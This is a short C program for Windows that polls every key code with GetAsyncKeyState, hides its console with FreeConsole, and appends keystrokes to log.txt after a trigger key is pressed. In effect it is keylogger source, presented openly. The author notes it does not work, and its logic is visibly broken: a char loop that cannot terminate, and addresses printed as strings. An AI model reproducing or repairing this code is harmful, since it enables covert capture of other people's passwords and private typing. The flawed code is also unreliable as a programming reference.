// Obviously doesn't work, yet, or maybe ever.

/*
    Debug Log so I don't go insane trying to make this work:
    SaveInt - Save key input states in a log file (broken)
    Save - Save key input in a log file (broken)
    Probable cause of everything being broken: Checking the wrong keycode.
*/

#include <windows.h>
#include <stdio.h>

int Save(int _key, char *file);
int SaveInt(int number, char *file);

int main(void){
    printf("%s\n", "Start of log");
    int back = 47;
    printf("%d", '/');
    printf("%s", &back);

    FreeConsole();

    char i;
    printf("%s\n", "INIT");
    while (1 == 1){
        Sleep(10);
        for (i = 8; i < 255; i++){
            //printf("%d", i);
            // SaveInt(GetAsyncKeyState(i),"log.txt");
            if ((GetAsyncKeyState(i) == -32767) && (i == 47)){
                printf("%s activated with %d", "Chat", i);
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}



int Save(int _key, char *file){
    printf("%d\n", _key);
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    int activeKey = 1;

    while (activeKey == 1){
        Sleep(10);
        for (char i = 8; i < 255; i++){
            if (i == VK_TAB){
                activeKey = 0;
                fclose(OUTPUT_FILE);
                break;
            }
            if ((GetAsyncKeyState(i) == -32767)){
                fprintf(OUTPUT_FILE, "%s", &_key);
            }
        }
    }
    return 0;
}

int SaveInt(int number, char *file){
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "%d,\n", number);
    fclose(OUTPUT_FILE);
    return 0;
}
